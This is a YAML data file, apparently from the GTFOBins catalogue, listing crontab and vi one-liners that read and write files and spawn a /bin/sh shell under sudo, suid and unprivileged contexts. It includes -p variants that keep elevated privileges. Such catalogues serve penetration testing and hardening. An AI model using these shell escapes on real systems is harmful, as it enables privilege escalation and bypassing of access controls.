source_data:
  GTFOBins:
    raw:
      documents:
        crontab:
          functions:
            command:
            - code: crontab -e
              comment: This spaws the default editor to edit the crontab file, commands can be scheduled
                to run using the [cron syntax](https://en.wikipedia.org/wiki/Cron).
              contexts:
                sudo: null
                unprivileged: null
            inherit:
            - code: crontab -e
              contexts:
                sudo: null
                unprivileged: null
              from: vi
        vi:
          functions:
            file-read:
            - code: vi /path/to/input-file
              contexts:
                sudo: null
                suid: null
                unprivileged: null
            file-write:
            - code: 'vi /path/to/output-file

                iDATA

                ^[

                w'
              comment: Where `^[` is the escape key.
              contexts:
                sudo: null
                suid: null
                unprivileged: null
            shell:
            - code: vi -c ':!/bin/sh' /dev/null
              contexts:
                sudo: null
                suid:
                  shell: true
                unprivileged: null
            - code: vi -c ':shell'
              contexts:
                sudo: null
                suid:
                  shell: true
                unprivileged: null
            - code: vi -c ':set shell=/bin/sh | shell'
              contexts:
                sudo: null
                suid:
                  code: vi -c ':set shell=/bin/sh\ -p | shell'
                  shell: false
                unprivileged: null
            - code: vi -c :terminal /bin/sh
              contexts:
                sudo: null
                suid:
                  code: vi -c ':terminal /bin/sh -p'
                  shell: false
                unprivileged: null
